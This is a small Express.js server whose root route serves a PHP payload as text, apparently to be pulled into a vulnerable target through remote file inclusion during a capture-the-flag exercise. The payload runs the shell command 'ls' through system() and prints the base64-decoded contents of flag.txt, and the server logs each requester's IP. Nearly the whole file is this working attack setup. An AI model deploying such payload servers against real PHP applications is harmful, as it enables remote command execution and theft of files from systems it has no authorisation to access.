import express from 'express';
import cors from 'cors';

const app = express();
const port = 3000;

// Middleware
app.use(express.json());
app.use(cors());

app.get('/', (req, res, next)=>{
    
    console.log(req.ip+req.url);
    res.status(200);
    res.send(` 
        <?php 
            echo '<pre>';
            system('ls');
            echo base64_decode(file_get_contents('flag.txt')); 
            echo '</pre>';
        ?>`);

})

app.listen(port, () => {
    console.log(`server listening on port ${port}`)
  })
